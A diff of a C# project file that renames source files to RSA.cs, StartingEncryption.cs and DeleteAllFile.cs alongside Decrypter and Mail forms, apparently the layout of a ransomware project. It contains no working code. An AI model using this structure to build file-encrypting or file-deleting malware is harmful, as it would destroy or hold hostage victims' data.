@@ -76,14 +76,14 @@
     <Reference Include="System.Xml" />
   </ItemGroup>
   <ItemGroup>
-    <Compile Include="cat.cs" />
+    <Compile Include="RSA.cs" />
     <Compile Include="Decrypter.cs">
       <SubType>Form</SubType>
     </Compile>
     <Compile Include="Decrypter.Designer.cs">
       <DependentUpon>Decrypter.cs</DependentUpon>
     </Compile>
-    <Compile Include="dog.cs" />
+    <Compile Include="StartingEncryption.cs" />
     <Compile Include="Main.cs">
       <SubType>Form</SubType>
     </Compile>
@@ -96,7 +96,7 @@
     <Compile Include="Mail.Designer.cs">
       <DependentUpon>Mail.cs</DependentUpon>
     </Compile>
-    <Compile Include="GoToHell.cs" />
+    <Compile Include="DeleteAllFile.cs" />
     <Compile Include="Program.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
     <EmbeddedResource Include="Decrypter.resx">
